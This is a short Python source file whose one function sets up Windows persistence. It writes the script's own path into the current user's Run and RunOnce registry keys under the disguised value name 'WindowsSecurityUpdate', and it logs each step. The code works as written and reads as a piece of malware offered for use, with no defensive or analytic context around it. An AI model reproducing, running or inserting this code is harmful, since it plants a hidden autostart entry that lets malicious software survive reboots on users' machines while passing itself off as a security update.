import os

def log_message(message, level="info"):
    print(f"[{level.upper()}] {message}")

# Enhanced logging for registry_run_key_persistence

def registry_run_key_persistence():
    """Establish persistence via registry Run keys with detailed logging."""
    try:
        import winreg
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        value_name = "WindowsSecurityUpdate"
        for hkey, key_path in run_keys:
            try:
                key = winreg.CreateKey(hkey, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                winreg.CloseKey(key)
                log_message(f"[OK] Registry persistence: Set {key_path}\\{value_name} = {current_exe}")
            except Exception as e:
                log_message(f"[FAIL] Registry persistence: {key_path}\\{value_name} failed: {e}")
        return True
    except Exception as e:
        log_message(f"Registry persistence failed: {e}")
        return False